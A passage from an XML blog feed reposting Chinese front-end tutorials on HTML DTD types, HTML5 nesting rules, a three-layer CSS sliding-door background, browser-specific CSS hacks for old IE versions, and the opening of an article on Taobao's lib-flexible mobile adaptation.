&lt;!--================== The Anchor Element ================================--&gt; &lt;!-- content is %Inline; except that anchors shouldn&apos;t be nested --&gt; &lt;!ELEMENT a %a.content;&gt; &lt;!ATTLIST a %attrs; %focus; charset %Charset; #IMPLIED type %ContentType; #IMPLIED name NMTOKEN #IMPLIED href %URI; #IMPLIED hreflang %LanguageCode; #IMPLIED rel %LinkTypes; #IMPLIED rev %LinkTypes; #IMPLIED shape %Shape; &quot;rect&quot; coords %Coords; #IMPLIED &gt; 这些代码规定了锚除了基本通用属性外的一些其他属性，如charset\type\name\href\hreflang\rel\rev等等，具体的诸如#IMPLIED &lt;!ELEMENT这些用法可以参考这里此外这个DTD还制定了一些其他的规范，如/下面必须至少有一个,还有哪些是block元素: &lt;!-- Unordered list --&gt; &lt;!ELEMENT ul (li)+&gt; &lt;!ATTLIST ul %attrs; &gt; &lt;!ENTITY % block &quot;p | %heading; | div | %lists; | %blocktext; | fieldset | table&quot;&gt; 通过以上一些代码片段我们知道了，DTD其实是一种约束规则，一个规范，规定了一个文档中有哪些元素，一个元素中有哪些属性以及元素之间的使用规则。 DTD的类型&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt; &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt; &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Frameset//EN&quot; &quot;http://www.w3.org/TR/html4/frameset.dtd&quot;&gt; &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt; &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt; &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Frameset//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd&quot;&gt; &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.1//EN&quot; &quot;http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd&quot;&gt; &lt;!DOCTYPE HTML&gt; 其实大家很容易发现主要有三种类型：strict（严格）、transitional（过度）、frameset（框架）。严格类型的DTD包含了大部分的html元素和属性，但一些过时的元素已经不再支持（font\u\s\iframe等）；过度的包含了所有的html元素和属性，过时的一些元素也支持；框架的DTD是为需要使用框架时所用到的DTD，如无框架，不会用到。其实大家会发现在public里还有html的版本类型，对于html版本类型不同而导致的不同的DTD，可以很容易理解：xhtml比html在更来得严谨(如xhtml区分大小写html不区分大小写)。当然最后的有点特殊的xhtml 1.1版本的DTD，这个版本没有具体什么类型，直接是xhtml11.dtd，它对html元素的支持性似乎更加严格，感兴趣的同学可以读读它的源文件。最后一个&lt;!DOCTYPE HTML&gt;真是简洁啊！不管你看的舒服不舒服，我反正看的很舒服。这个是html5的DTD头，不一定说用到html5最新的标签才可以用这个DTD的头，以前的神马的也可以用这个头，不也属于html5支持的标签不是吗？现在大家正常用的是xhtml过度的DTD，但目前的情况时越来越多的网站已经开始精简dtd，如百度、雅虎、谷歌等已经精简啦。携程的还是很长的xhtml的过度DTD，啥时决定精简我们这种小人物也不好说。。 转自：http://www.smallni.com/dtd/]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[HTML5的元素嵌套规则👗]]></title>
      <url>%2F2016%2F06%2F17%2F41%2F</url>
      <content type="text"><![CDATA[先来看以下这样一段代码： &lt;ul&gt; &lt;li&gt;&lt;h4&gt;&lt;a href=&quot;&quot;&gt;&lt;div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/h4&gt;&lt;/li&gt; &lt;/ul&gt; 当然，我是不会告诉你这段代码来自于FACEBOOK的 ，各位认为以上元素的嵌套有没有问题呢？我们会在后面讨论这个。 HTML4/XHTML的嵌套规则在我们的印象中会有这样的嵌套规则： 内联元素不能嵌套块元素&lt;p&gt;元素和&lt;h1~6&gt;元素不能嵌套块元素 那么到底什么是块元素，什么是内联元素？以下是W3C CSS2.1规范中对块元素和内联元素的定义： Block-level elements are those elements of the source document that are formatted visually as blocks (e.g., paragraphs). The following values of the &apos;display&apos; property make an element block-level: &apos;block&apos;, &apos;list-item&apos;, and &apos;table&apos;. Inline-level elements are those elements of the source document that do not form new blocks of content; the content is distributed in lines (e.g., emphasized pieces of text within a paragraph, inline images, etc.). The following values of the &apos;display&apos; property make an element inline-level: &apos;inline&apos;, &apos;inline-table&apos;, and &apos;inline-block&apos;. Inline-level elements generate inline-level boxes, which are boxes that participate in an inline formatting context. 我们可以这样理解：块元素一般都从新行开始，内联元素在一行内显示，我们也可以通过CSS属性display的’inline’ 或 ‘ block’ 来改变元素为内联元素或块元素，当然这是CSS中对元素的分类，显然用 ‘display’ 的属性值来对html元素进行分类是不严谨的。如果按照上述规则来讲，那么FACEBOOK的做法就是一种错误的做法，因为他在内联元素元素中嵌套了块元素元素，但是细心的读者应该会发现上述规则是基于HTML4/xHTML1的strict模式，而FACEBOOK现在已经统一使用了html5的doctype，那么这个规则到底还是是否适用？ HTML5的元素嵌套规则元素的嵌套规则和页面头部申明的DTD有着千丝万缕的关系，DTD基础请查看我之前写的文章《DTD详解》，那么在最新的HTML5规范中是否对元素嵌套有着新的规范呢？让我们先了解下W3C在最新的HTML5规范中对元素的分类方式：如上图，元素的分类不再是块元素或内联元素这样来分类（其实从来就没有这样分），而是按照如下分类来分：Flow（流式元素）、Heading（标题元素）、Sectioning（章节元素）、Phrasing（段落元素）、Embedded（嵌入元素）、Interactive（交互元素）、Metadata（元数据元素）。 Flow（流式元素）在应用程序和文档的主体部分中使用的大部分元素都被分类为流式元素。 a， abbr， address， area（如果它是map元素的后裔）， article， aside， audio， b， bdi， bdo， blockquote， br， button， canvas， cite， code， command， datalist， del， details， dfn， div， dl，em， embed， fieldset， figure， footer， form， h1， h2， h3， h4， h5， h6， header， hgroup， hr， i， iframe， img， input， ins， kbd， keygen， label， map， mark， math， menu， meter，nav， noscript， object， ol， output， p， pre， progress， q， ruby， s， samp， script， section， select， small， span， strong， style（如果该元素设置了scoped属性）， sub， sup， svg， table，textarea， time， u， ul， var， video， wbr， text Heading（标题元素）标题式元素定义一个区块/章节（section）（无论是明确的使用章节式内容的元素标记，或者标题式内容自身所隐含的）的标题。 h1， h2， h3， h4， h5， h6， hgroup Sectioning（章节元素）章节式元素是用于定义标题及页脚范围的元素。 article， aside， nav， section Phrasing（段落元素）段落式元素是文档中的文本、标记段落级文本的元素。 a（如果其只包含段落式元素）， abbr， area（如果它是map元素的后裔）， audio， b， bdi， bdo， br， button， canvas， cite， code， command， datalist， del（如果其只包含段落式元素）， dfn， em， embed， i，iframe， img， input， ins（如果其只包含段落式元素）， kbd， keygen， label， map（如果其只包含段落式元素）， mark， math， meter， noscript， object， output， progress， q， ruby， s， samp， script，select， small， span， strong， sub， sup， svg， textarea， time， u， var， video， wbr， text Embedded（嵌入元素）嵌入式元素是引用或插入到文档中其他资源的元素。audio， canvas， embed， iframe， img， math， object， svg， video Interactive（交互元素）交互式元素是专门用于与用户交互的元素。 a， audio（如果设置了controls属性）， button， details， embed， iframe， img（如果设置了usemap属性）， input（如果type属性不为hidden状态）， keygen， label， menu（如果type属性为toolbar状态），object（如果设置了usemap属性）， select， textarea， video（如果设置了controls属性） Metadata（元数据元素）元数据元素是可以被用于说明其他内容的表现或行为，或者在当前文档和其他文档之间建立联系的元素 base，command，link，meta，noscript，script，style，title 各分类会有交叉或重叠的现象，这说明在html5中，元素可能属于上述所有分类中的一个或多个。例子(1)：&lt; h1 &gt;~&lt; h6 &gt;元素： Categories:Flow content.Heading content.Palpable content. Contexts in which this element can be used:As a child of an hgroup element.Where flow content is expected. Content model:Phrasing content.其中的「Categories」说明该元素的类别，「Contexts in which this element can be used」说明该元素能在何种场景下被使用，也就是它的父元素是什么，「Content model」说明该元素可以包含的内容是什么，由于页面中的元素是层层嵌套的，一个元素有可能既是父元素同时也是子元素的角色，所以下面我们以「Content model」也就是可包含的子元素做讨论。那么对于h1~h6元素： 它们同时属于Flow content 、Heading content 和 Palpable content三个分类 它们的父元素可以是&lt; hgroup &gt;，同时那些子元素是流式元素的元素也可以作为h1-h6元素的父元素 它们允许的子元素是段落式元素 例子(2)：&lt; div &gt;元素 Categories:Flow content.Palpable content. Contexts in which this element can be used:Where phrasing content is expected. Content model:Flow content.对于&lt; div &gt;元素： 同时属于Flow content 、 Palpable content分类 父元素必须是那些子元素为段落式元素的元素 允许的子元素是流式元素 元素允许的子元素是流式元素，流式元素基本涵括了页面中的大部分元素，所以我们在用时可以不用担心嵌套错误的问题。但对于&lt; h1 &gt;~&lt; h6 &gt;元素，它们允许的子元素为段落式元素，而段落式元素并不包含诸如&lt; div &gt;、&lt; p &gt;、&lt; ul &gt;&lt; ol &gt;之类的元素，这就说明按照html5的规范，是不允许在标题元素内部嵌入&lt; div &gt;、&lt; p &gt;、&lt; ul &gt;&lt; ol &gt;之类的元素。例子(3)：&lt; a &gt;元素 Categories:Flow content.Phrasing content.Interactive content.Palpable content. Contexts in which this element can be used:Where phrasing content is expected. Content model:Transparent, but there must be no interactive content descendant.对于&lt; a &gt;元素： 同时属于Flow content 、 Phrasing content、Interactive content、Palpable content分类 父元素必须是那些子元素为段落式元素的元素 允许的子元素是以它的父元素允许的子元素为准，但不能包含交互式元素 这样看&lt; a &gt;元素还是挺有意思的，允许的子元素要看它的父元素所能包含的子元素。 再来看文章开头中提到的代码&lt;ul&gt; &lt;li&gt;&lt;h4&gt;&lt;a href=&quot;&quot;&gt;&lt;div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/h4&gt;&lt;/li&gt; &lt;/ul&gt; 这时&lt; a &gt;的父元素为&lt; div &gt;，而&lt; div &gt;元素允许的子元素是流式元素，流式元素中包含元素，所以这样的情形下在&lt; a &gt;里面嵌套&lt; div &gt;就是正确的做法！ 嵌套错误可能引起的问题上面讲了HTML5对元素新的分类方式和以&lt; h1 &gt;~&lt; h6 &gt;、&lt; div &gt;、&lt; a &gt;元素举例讲述了各自的嵌套规则，但FACEBOOK即使不按照标准去嵌套也不会有大的错误问题，这就给我们带来了一个思考：嵌套错误到底会不会有问题？例子(1)：开始与结束标签嵌套错误 &lt;div&gt;&lt;h2&gt;内容&lt;/div&gt;&lt;/h2&gt; 测试结果：例子(2)：元素嵌套元素 &lt;p&gt;&lt;div&gt;内容&lt;/div&gt;&lt;/p&gt; 测试结果：例子(3)：列表元素&lt; li &gt;兄弟元素为&lt; div &gt; &lt;ul&gt;&lt;li&gt;内容&lt;/li&gt;&lt;div&gt;内容&lt;/div&gt;&lt;/ul&gt; 测试结果：例子(4)：&lt; h2 &gt;元素嵌套&lt; div &gt;元素 &lt;h2&gt;&lt;div&gt;内容&lt;/div&gt;&lt;/h2&gt; 测试结果：例子(5)：&lt; a &gt;元素嵌套&lt; a &gt;元素 &lt;a href=&quot;&quot;&gt;&lt;a href=&quot;&quot;&gt;内容&lt;/a&gt;&lt;/a&gt; 测试结果： 通过上述例子，我们总结如下： 元素开始与结束标签嵌套错误，页面可以在大部分浏览器被正常解析，IE9会出现解析错误 在&lt; p &gt;元素内嵌入&lt; div &gt;等元素造成所有浏览器的解析错误 在&lt; h1 &gt;~&lt; h6 &gt;元素内嵌入&lt; div &gt;等元素所有浏览器可以解析正常 在&lt; a &gt;元素内嵌入&lt; a &gt;元素会导致所有浏览器的解析错误 在列表元素&lt; li &gt;&lt; dt &gt;&lt; dd &gt;等插入非列表兄弟元素会导致IE6\IE7的解析错误 其实，这里说解析错误并不是很合理，应该是说浏览器解析出来的结果和我们期望的结果不一致，但任何的嵌套错误都不会导致页面呈现有很大的出错。我们知道JS代码如果写的有语法错误，浏览器的JS解释器就会拒绝执行并且报错，而浏览器在遇到不符合语法规定的HTML代码时则会千方百计将其呈现出来。 严格嵌套约束、语义嵌套约束通过上面的示例我们发现在&lt; p &gt;元素里嵌套元素或者&lt; a &gt;元素里&lt; a &gt;元素会导致所有的浏览器都解析错误，这其实是W3C规范的严格嵌套约束，严格嵌套约束要求必须去遵守，不然就会导致所有浏览器的解析错误。 严格嵌套约束规则： a元素里不可以嵌套交互式元素(&lt; a &gt;、&lt; button &gt;、&lt; select &gt;等) &lt; p &gt;里面不可以嵌套&lt; div &gt;、&lt; h1 &gt;~&lt; h6 &gt;、&lt; p &gt;、&lt; ul &gt;/&lt; ol &gt;/&lt; li &gt;、&lt; dl &gt;/&lt; dt &gt;/&lt; dd &gt;、&lt; form &gt;等 暂时没有发现更多，有的欢迎告诉我 语义嵌套约束：每个元素基本都有自己的嵌套规则（即父元素可以是什么，子元素可以是什么），除了严格嵌套约束之外的一些规则就是语义嵌套约束，对于语义嵌套约束，如果不遵守，页面可能正常，但也可能解析错误，这和下面要讲的容错机制有关。 浏览器的容错机制并不是每位同学在写完页面后去做合法性检查，因此浏览器厂商不得不让它们的浏览器以尽可能宽松的方式去处理网页，每个浏览器内核中都有相当一部分代码专门用来处理那些含糊不清的html标记及嵌套，并且会去猜测前端们到底想如何呈现网页，这是浏览器的容错机制。这其实在告诉我们，我们写出来的HTML代码不符合W3C规范可能最终呈现出来没有异样，但那其实是浏览器的一种容错机制，我们没有理由让自己以一个随性的态度去coding，对待自己的代码应该一丝不苟，即使HTML5的胸襟很宽广。 拥抱WEB标准原本我们认为从HTML4到XHTML是一个时代，现在又从XHTML跨到了HTML5，新时代新标准的诞生，我们应该敞开胸怀去拥抱，而不是排斥。你关注或不关注，标准就在那里，只增不减。我们应该感谢W3C这样一个组织，让各个浏览器厂商抛开彼此的敌意共同制定新的标准。不然，也许你会像90年代那样，JS引用一个元素都需要为某个浏览器写一套自己的代码。WEB标准只会使我们吃饭变得更香，睡眠变得更好，新的技术或标准会推动我们去富有热情的coding，而不是每天在重复劳动。 转自：http://www.5icool.org/a/201308/a2081_2.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[HTML+CSS: 三层嵌套（滑动门、背景图自适应扩展）💚]]></title>
      <url>%2F2016%2F06%2F16%2F40%2F</url>
      <content type="text"><![CDATA[利用三层嵌套实现背景图自适应扩展：我们现在要将上图用html+css实现，并且实现背景图根据内容（Browse Categories）​的长度自适应宽。要实现这个效果，①：切出图中三个黄色框框的部分是我们要切出三张等宽图片。并将它们纵向拼接在同一张图片中。如下（尺寸为：887，路径：url(../images/side_bg.png)）：*（PS：这里提醒大家，如果效果图中的平铺部分，是x轴方向的，则将切下的图纵向拼接；如果平铺部分是y轴方向，则将切下的图横向拼接。）②：写HTML结构：​这里用 h2/strong/span三个标签负责三层嵌套：​h2负责中间的平铺背景；strong负责​左边的圆角；span负责​右边的圆角； &lt;div id=&quot;side_menu&quot;&gt; &lt;!--上面的三层嵌套--&gt; &lt;h2&gt;&lt;strong&gt;&lt;span&gt;Browse Categories&lt;/span&gt;&lt;/strong&gt;&lt;h2&gt; &lt;/div&gt; HTML结构③：写CSS样式​： #side_menu h2{ /*中间的bg*/ width:210px; height:29px; background:url(../images/side_bg.png) repeat-x 0 -58px; } 解析：用background的url引入我们刚刚切出的三部分拼图，由于​切出的每部分的高度是29px，设置需要平铺的宽度，这里我们设置为210px。水平平铺：repeat-x由于中间部分的图我们拼接在side_bg.png的最下面，每部分高度为29px，所以要往上移动29*2=58px的距离，所以在水平方向在效果图的左边，不需要移动，所以设置为0，垂直方向设置为 -58px​。 #side_menu h2 strong{ /*左边的bg*/ display:block; heigth:29px; background:url(../images/side_bg.png) no-repeat; }​ 解析：这是左边圆角背景的引入，不重复​no-repeat左边圆角放在side_bg.png中的最上面，不需要位置移动。 #side_menu h2 span{ /*右边的bg*/ display:block; height:28px; background:url(../images/side_bg.png) no-repeat right -29px; } 解析：这是右边圆角背景的引入，不重复​ no-repeat左边圆角放在side_bg.png中的中间，所以垂直方向向上移动29px设置为 -29px又由于​这个圆角是放在效果图的右边，所以设置水平方向位置为right。到这里，就完成了效果图的制作。如有不周到地方请指出，谢谢。 转自：http://blog.sina.com.cn/s/blog_7b91665f0102w482.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CSS hack大全&详解（什么是CSS hack）👾]]></title>
      <url>%2F2016%2F06%2F13%2F39%2F</url>
      <content type="text"><![CDATA[原文：http://www.kwstu.com/Admin/ViewArticle/201409011604277330CSS hack大全&amp;详解（什么是CSS hack） 1、什么是CSS hack?CSS hack是通过在CSS样式中加入一些特殊的符号，让不同的浏览器识别不同的符号（什么样的浏览器识别什么样的符号是有标准的，CSS hack就是让你记住这个标准），以达到应用不同的CSS样式的目的，比如.kwstu{width:300px;_width:200px;}，一般浏览器会先给元素使用width:300px;的样式，紧接着后面还有个_width:200px;由于下划线_width只有IE6可以识别，所以此样式在IE6中实际设置对象的宽度为200px，后面的把前面的给覆盖了，而其他浏览器不识别_width不会执行_width:200px;这句样式，所以在其他浏览器中设置对象的宽度就是300px;以下是引自百度文库的定义 简单地讲，css hack指各版本及各品牌浏览器之间对CSS解释后出现网页内容的误差(比如我们常说错位)的处理。由于各浏览器的内核不同，所以会造成一些误差就像JS一样，一个JS网页特效，在微软IE6、IE7、IE8浏览器有效果，但可能在火狐（Mozilla Firefox）谷歌浏览器无效，这样就叫做JS hack ，所以我们对于CSS来说他们来解决各浏览器对CSS解释不同所采取的区别不同浏览器制作不同的CSS样式的设置来解决这些问题就叫作CSS Hack。 注意：我们通常主要考虑的浏览器有IE6、IE7、IE8、谷歌浏览器（chrome）、火狐（Mozilla Firefox）即可，至于我们常用的傲游、QQ的TT浏览器是用你计算机中装的系统自带浏览器的内核，所以只需要兼容以上浏览器即可兼容TT\傲游浏览器。 2、CSS hack解决问题CSS hack用来解决有些css属性在不同浏览器中显示的效果不一样的问题，如margin属性在ie6中显示的距离会比其他浏览器中显示的距离宽2倍，也就是说margin-left:20px;在ie6中距左侧对象的实际显示距离是40px，而在非ie6中显示的距左侧对象的距离是设置的值20px;所以要想设置一个对象距离左侧对象的距离在所有浏览器中都显示是20px的宽度的样式应为：.kwstu{margin-left:20px;_margin-left:20px;}。 3、浏览器识别字符标准对应表从上图可以分析出以下几种情况： 1.大部分特殊字符IE浏览器支持，其他主流浏览器firefox，chrome，opera，safari不支持 (opera可识别除外)。&lt;br&gt; 2.\9 ：所有IE浏览器都支持&lt;br&gt; 3._和- ：仅IE6支持&lt;br&gt; 4.* ：IE6、E7支持&lt;br&gt; 5.\0 ：IE8、IE9支持，opera部分支持&lt;br&gt; 6.\9\0 ：IE8部分支持、IE9支持&lt;br&gt; 7.\0\9 ：IE8、IE9支持&lt;br&gt; 4、各种CSS hack情况介绍1.区别IE和非IE浏览器#tip{ background:blue;/*非IE背景蓝色 因为所有浏览器都能解释*/ background:red\9;/*IE6、IE7、IE8、IE9背景紅色 因为\9在IE6.7.8.9中可以识别，覆盖上面样式 IE10跟11应该不识别，IE11测试确定*/ } 2.区别IE6,IE7,IE8,FF【区别符号】：“\9”、“*”、“_” #tip{ background:blue;/*Firefox背景变蓝色 所有浏览器都支持*/ background:red\9;/*IE8背景变红色 IE6、7、8、9支持覆盖上面样式*/ *background:black;/*IE7背景变黑色 IE6、7支持又一次覆盖上面样式*/ _background:orange;/*IE6背景变橘色 紧IE6支持又一次覆盖上面样式*/ } 说明】：因为IE系列浏览器可读「\9」，而IE6和IE7可读「*」(米字号)，另外IE6可辨识「_」(底线)，因此可以依照顺序写下来，就会让浏览器正确的读取到自己看得懂得CSS语法，所以就可以有效区分IE各版本和非IE浏览器(像是Firefox、Opera、GoogleChrome、Safari等)。 3.区别IE6、IE7、Firefox(方法1)【区别符号】：“*”、“_” #tip{ background:blue;/*Firefox背景变蓝色*/ *background:black;/*IE7背景变黑色*/ _background:orange;/*IE6背景变橘色*/ } 【说明】：IE7和IE6可读「*」(米字号)，IE6又可以读「_」(底线)，但是IE7却无法读取「_」，至于Firefox(非IE浏览器)则完全无法辨识「*」和「_」，因此就可以透过这样的差异性来区分IE6、IE7、Firefox 4.区别IE6、IE7、Firefox(方法2)【区别符号】：“*”、“!important” #tip{ background:blue;/*Firefox背景变蓝色*/ *background:green!important;/*IE7背景变绿色*/ *background:orange;/*IE6背景变橘色*/ } 【说明】：IE7可以辨识「*」和「!important」，但是IE6只可以辨识「*」，却无法辨识「!important」，至于Firefox可以读取「!important」但不能辨识「*」因此可以透过这样的差异来有效区隔IE6、IE7、Firefox。 5.区别IE7、Firefox【区别符号】：“*”、“!important” #tip{ background:blue;/*Firefox背景变蓝色*/ *background:green!important;/*IE7背景变绿色*/ } 【说明】：因为Firefox可以辨识「!important」但却无法辨识「*」，而IE7则可以同时看懂「*」、「!important」，因此可以两个辨识符号来区隔IE7和Firefox。 6.区别IE6、IE7(方法1)【区别符号】：“*”、“_” #tip{ *background:black;/*IE7背景变黑色*/ _background:orange;/*IE6背景变橘色*/ } 【说明】：IE7和IE6都可以辨识「*」(米字号)，但IE6可以辨识「_」(底线)，IE7却无法辨识，透过IE7无法读取「_」的特性就能轻鬆区隔IE6和IE7之间的差异。 7.区别IE6、IE7(方法2)【区别符号】：“!important” #tip{ background:black!important;/*IE7背景变黑色*/ background:orange;/*IE6背景变橘色*/ } 【说明】：因为IE7可读取「!important;」但IE6却不行，而CSS的读取步骤是从上到下，因此IE6读取时因无法辨识「!important」而直接跳到下一行读取CSS，所以背景色会呈现橘色。 8.区别IE6、Firefox【区别符号】：“_” #tip{ background:black;/*Firefox背景变黑色*/ _background:orange;/*IE6背景变橘色*/ } 【说明】：因为IE6可以辨识「_」(底线)，但是Firefox却不行，因此可以透过这样的差异来区隔Firefox和IE6，有效达成CSShack。 5、IE浏览器下hack总结element{ color：#666\9； //IE8 IE9 * color：#999； //IE7 _color:#EBEBEB； //IE6 } 可以看出，利用字符识别无法区分IE8和IE9，我们可以从伪类的识别来区分 element{ color：#666\9； //IE8 * color：#999； //IE7 _color:#EBEBEB； //IE6 } :root element{color：#666\9;}//IE9 【说明】：“:root”伪类IE系列只有IE9支持，其他主流浏览器均支持，利用这一点来区分IE8和IE9。另外考虑到opera部分支持，完全支持:root,所以不使用。 6、其他主流浏览器css hack总结1.Firefox浏览器：mozilla私有属性@-moz-document url-prefix(){ .element{color:#f1f1f1;}} //Firefox 2.Webkit和Opera:@media all and (min-width: 0px){ .element{color:#777;} } //Webkit @media screen and (-webkit-min-device-pixel-ratio:0) { .element{color:#444;} } //Opera @media all and (-webkit-min-device-pixel-ratio:10000), not all and (-webkit-min-device-pixel-ratio:0) { .element{color:#336699;} } 7、兼容各大主流浏览器(最新版本)css hack汇总如下（最全的）：.element{ color:#000; /*w3c标准*/ [;color:#f00;]; /*Webkit(chrome和safari)*/ color:#666\9; /*IE8*/ *color:#999; /*IE7*/ _color:#333; /*IE6*/ } :root .element{color:#0f0\9;} /*IE9*/ @media all and (-webkit-min-device-pixel-ratio:10000), not all and ( -webkit-min-device-pixel-ratio:0) { .element{color:#336699;}} /*opera*/ @-moz-document url-prefix(){ .element{color:#f1f1f1;}} /*Firefox*/ 8、建议：实际开发先如果不是很清楚可以先写布局代码，写一个阶段用浏览器测试工具（常用工具推荐IETEST）测试一个各个版本浏览器的布局效果，如有问题针对有问题的浏览器单独调试。转自：http://blog.csdn.net/liu_rong_fei/article/details/51555438]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[使用Flexible实现手淘H5页面的终端适配 🍧]]></title>
      <url>%2F2016%2F06%2F10%2F38%2F</url>
      <content type="text"><![CDATA[曾几何时为了兼容IE低版本浏览器而头痛，以为到Mobile时代可以跟这些麻烦说拜拜。可没想到到了移动时代，为了处理各终端的适配而乱了手脚。对于混迹各社区的偶，时常发现大家拿手机淘宝的H5页面做讨论——手淘的H5页面是如何实现多终端的适配？那么趁此Amfe阿里无线前端团队双11技术连载之际，用一个实战案例来告诉大家，手淘的H5页面是如何实现多终端适配的，希望这篇文章对大家在Mobile的世界中能过得更轻松。 目标 拿一个双11的Mobile页面来做案例，比如你实现一个类似下图的一个H5页面：目标很清晰，就是做一个这样的H5页面。DEMO请用手机扫下面的二维码 痛点 虽然H5的页面与PC的Web页面相比简单了不少，但让我们头痛的事情是要想尽办法让页面能适配众多不同的终端设备。看看下图你就会知道，这是多么痛苦的一件事情：点击这里查看更多终端设备的参数。再来看看手淘H5要适配的终端设备数据：看到这些数据，是否死的心都有了，或者说为此捏了一把汗出来。 手淘团队适配协作模式 早期移动端开发，对于终端设备适配问题只属于Android系列，只不过很多设计师常常忽略Android适配问题，只出一套iOS平台设计稿。但随着iPhone6，iPhone6+的出现，从此终端适配问题不再是Android系列了，也从这个时候让移动端适配全面进入到“杂屏”时代。上图来自于paintcodeapp.com为了应对这多么的终端设备，设计师和前端开发之间又应该采用什么协作模式？或许大家对此也非常感兴趣。而整个手淘设计师和前端开发的适配协作基本思路是： 选择一种尺寸作为设计和开发基准 定义一套适配规则，自动适配剩下的两种尺寸(其实不仅这两种，你懂的) 特殊适配效果给出设计效果 还是上一张图吧，因为一图胜过千言万语：在此也不做更多的阐述。在手淘的设计师和前端开发协作过程中：手淘设计师常选择iPhone6作为基准设计尺寸，交付给前端的设计尺寸是按750px * 1334px为准(高度会随着内容多少而改变)。前端开发人员通过一套适配规则自动适配到其他的尺寸。根据上面所说的，设计师给我们的设计图是一个750px * 1600px的页面： 前端开发完成终端适配方案 拿到设计师给的设计图之后，剩下的事情是前端开发人员的事了。而手淘经过多年的摸索和实战，总结了一套移动端适配的方案——flexible方案。这种方案具体在实际开发中如何使用，暂时先卖个关子，在继续详细的开发实施之前，我们要先了解一些基本概念。 一些基本概念在进行具体实战之前，首先得了解下面这些基本概念(术语)： 视窗 viewport简单的理解，viewport是严格等于浏览器的窗口。在桌面浏览器中，viewport就是浏览器窗口的宽度高度。但在移动端设备上就有点复杂。移动端的viewport太窄，为了能更好为CSS布局服务，所以提供了两个viewport:虚拟的viewportvisualviewport和布局的viewportlayoutviewport。eorge Cummins在Stack Overflow上对这两个基本概念做了详细的解释。而事实上viewport是一个很复杂的知识点，上面的简单描述可能无法帮助你更好的理解viewport，而你又想对此做更深的了解，可以阅读PPK写的相关教程。 物理像素(physical pixel)理像素又被称为设备像素，他是显示设备中一个最微小的物理部件。每个像素可以根据操作系统设置自己的颜色和亮度。正是这些设备像素的微小距离欺骗了我们肉眼看到的图像效果。 设备独立像素(density-independent pixel)设备独立像素也称为密度无关像素，可以认为是计算机坐标系统中的一个点，这个点代表一个可以由程序使用的虚拟像素(比如说CSS像素)，然后由相关系统转换为物理像素。 CSS像素CSS像素是一个抽像的单位，主要使用在浏览器上，用来精确度量Web页面上的内容。一般情况之下，CSS像素称为与设备无关的像素(device-independent pixel)，简称DIPs。 屏幕密度屏幕密度是指一个设备表面上存在的像素数量，它通常以每英寸有多少像素来计算(PPI)。 设备像素比(device pixel ratio)设备像素比简称为dpr，其定义了物理像素和设备独立像素的对应关系。它的值可以按下面的公式计算得到： 设备像素比 ＝ 物理像素 / 设备独立像素 在JavaScript中，可以通过window.devicePixelRatio获取到当前设备的dpr。而在CSS中，可以通过-webkit-device-pixel-ratio，-webkit-min-device-pixel-ratio和 -webkit-max-device-pixel-ratio进行媒体查询，对不同dpr的设备，做一些样式适配(这里只针对webkit内核的浏览器和webview)。dip或dp,（device independent pixels，设备独立像素）与屏幕密度有关。dip可以用来辅助区分视网膜设备还是非视网膜设备。缩合上述的几个概念，用一张图来解释：众所周知，iPhone6的设备宽度和高度为375pt * 667pt,可以理解为设备的独立像素；而其dpr为2，根据上面公式，我们可以很轻松得知其物理像素为750pt * 1334pt。如下图所示，某元素的CSS样式： width: 2px; height: 2px； 在不同的屏幕上，CSS像素所呈现的物理尺寸是一致的，而不同的是CSS像素所对应的物理像素具数是不一致的。在普通屏幕下1个CSS像素对应1个物理像素，而在Retina屏幕下，1个CSS像素对应的却是4个物理像素。有关于更多的介绍可以点击这里详细了解。看到这里，你能感觉到，在移动端时代屏幕适配除了Layout之外，还要考虑到图片的适配，因为其直接影响到页面显示质量，对于如何实现图片适配，再此不做过多详细阐述。这里盗用了@南宮瑞揚根据mir.aculo.us翻译的一张信息图： meta标签&lt;meta&gt;标签有很多种，而这里要着重说的是viewport的meta标签，其主要用来告诉浏览器如何规范的渲染Web页面，而你则需要告诉它视窗有多大。在开发移动端页面，我们需要设置meta标签如下： &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;&gt; 代码以显示网页的屏幕宽度定义了视窗宽度。网页的比例和最大比例被设置为100%。留个悬念，因为后面的解决方案中需要重度依赖meta标签。 CSS单位rem在W3C规范中是这样描述rem的: font size of the root element. 简单的理解，rem就是相对于根元素&lt;html&gt;的font-size来做计算。而我们的方案中使用rem单位，是能轻易的根据&lt;html&gt;的font-size计算出元素的盒模型大小。而这个特色对我们来说是特别的有益处。 前端实现方案解了前面一些相关概念之后，接下来我们来看实际解决方案。在整个手淘团队，我们有一个名叫lib-flexible的库，而这个库就是用来解决H5页面终端适配的。 lib-flexible是什么？lib-flexible是一个制作H5适配的开源库，可以点击这里下载相关文件，获取需要的JavaScript和CSS文件。当然你可以直接使用阿里CDN： &lt;script src=&quot;http://g.tbcdn.cn/mtb/lib-flexible/{{version}}/??flexible_css.js,flexible.js&quot;&gt;&lt;/script&gt; 代码中的换成对应的版本号0.3.4。 使用方法lib-flexible库的使用方法非常的简单，只需要在Web页面的&lt;head&gt;&lt;/head&gt;中添加对应的flexible_css.js,flexible.js文件：第一种方法是将文件下载到你的项目中，然后通过相对路径添加: &lt;script 